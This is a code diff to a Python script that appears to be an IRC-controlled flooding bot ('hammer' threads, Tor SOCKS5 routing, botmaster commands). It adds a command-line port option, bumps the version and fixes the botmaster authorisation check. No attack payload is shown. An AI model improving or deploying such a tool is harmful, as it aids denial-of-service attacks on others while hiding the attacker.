@@ -2,6 +2,7 @@
 import re
 import claudiashammer
 import requests
+import argparse
 import socks
 import socket
 import ssl
@@ -44,7 +45,14 @@ port = None
 # Config
 
 config = {}
-execfile("configuration.conf", config) 
+execfile("configuration.conf", config)
+
+# Argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--port", "-p",
+                    help="SOCKS5 port")
+args = parser.parse_args()
 
 # Classes & Threading
 
@@ -55,12 +63,12 @@ class hammer(threading.Thread):
 print(bcolors.OKBLUE + art + bcolors.ENDC)
 time.sleep(1)
 
-version = "0.1.2"
+version = "0.1.3"
 
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
 print(bcolors.OKBLUE + "v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)
 
-sport = raw_input("SOCKS5 port (def. 9050): ")
+sport = args.port if args.port else raw_input("SOCKS5 port (def. 9050): ")
 if sport == "":
     sport = 9050
 else:
@@ -200,7 +208,7 @@ while 1:
         
         #check for commands only authorized people can give
     
-    if (senderuser == botmaster or masterbot) or senderuser in admins:
+    if (senderuser == botmaster) or (senderuser == masterbot) or (senderuser in admins):
         auth = senderuser
         allowed = 1
 
